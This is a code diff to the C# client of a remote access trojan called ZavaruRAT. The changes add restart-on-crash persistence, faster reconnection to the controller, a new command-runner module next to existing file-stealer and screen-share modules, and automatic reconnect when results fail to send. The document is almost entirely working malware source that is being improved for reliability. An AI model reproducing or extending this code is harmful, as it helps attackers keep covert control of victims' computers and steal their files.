@@ -10,6 +10,14 @@ using ZavaruRAT.Shared.Models.Client;
 
 #endregion
 
+AppDomain.CurrentDomain.UnhandledException += (sender, eventArgs) =>
+{
+    Debug.WriteLine(sender);
+    Debug.WriteLine(eventArgs.ExceptionObject);
+
+    Installation.Restart();
+};
+
 Utilities.EnsureOneInstance();
 
 var autoStart = Installation.AddAutoStart();
@@ -28,6 +36,7 @@ catch (Exception e)
 }
 
 osInfo.AutoStart = autoStart;
+osInfo.InstallationPath = Installation.ExecutablePath;
 
 async Task<ZavaruClient> ConnectUntilSuccessAsync()
 {
@@ -51,11 +60,17 @@ async Task<ZavaruClient> ConnectUntilSuccessAsync()
             Debug.WriteLine(e);
         }
 
-        if ((int)repeatTime.TotalSeconds != 16)
+        if ((int)repeatTime.TotalSeconds != 8)
         {
             repeatTime *= 2;
-            Debug.WriteLine("Repeat time: {0}", repeatTime);
         }
+
+        if (repeatTime.TotalSeconds > 10)
+        {
+            repeatTime = TimeSpan.FromSeconds(10);
+        }
+
+        Debug.WriteLine("Repeat time: {0}", repeatTime);
 
         await Task.Delay(repeatTime);
     }
@@ -66,6 +81,7 @@ async Task<ZavaruClient> ConnectUntilSuccessAsync()
 var commandExecutor = new CommandExecutor()
                       .AddModule<ExampleModule>()
                       .AddModule<FileStealerModule>()
+                      .AddModule<RunnerModule>()
                       .AddModule<EmergencyModule>()
                       .AddModule<ScreenShareModule>()
                       .AddModule<FunModule>();
@@ -100,7 +116,12 @@ while (true)
         continue;
     }
 
+    Debug.WriteLine(command.Id);
+    Debug.WriteLine(command.CommandName);
+    Debug.WriteLine(command.Args);
+
     var isRealTime = commandExecutor.IsRealTime(command);
+    Debug.WriteLine("Is real time: {0}", isRealTime);
 
     if (isRealTime)
     {
@@ -113,6 +134,23 @@ while (true)
     var result = await commandExecutor.ExecuteAsync(command, client);
     Debug.WriteLine(result);
 
-    await client.SendAsync(result);
+    try
+    {
+        await client.SendAsync(result);
+    }
+    catch (Exception e)
+    {
+        Debug.WriteLine(e);
+
+        if (!client.Connected)
+        {
+            Debug.WriteLine("Disconnected!");
+
+            client = await ConnectUntilSuccessAsync();
+        }
+
+        continue;
+    }
+
     Debug.WriteLine("Loop done!");
 }
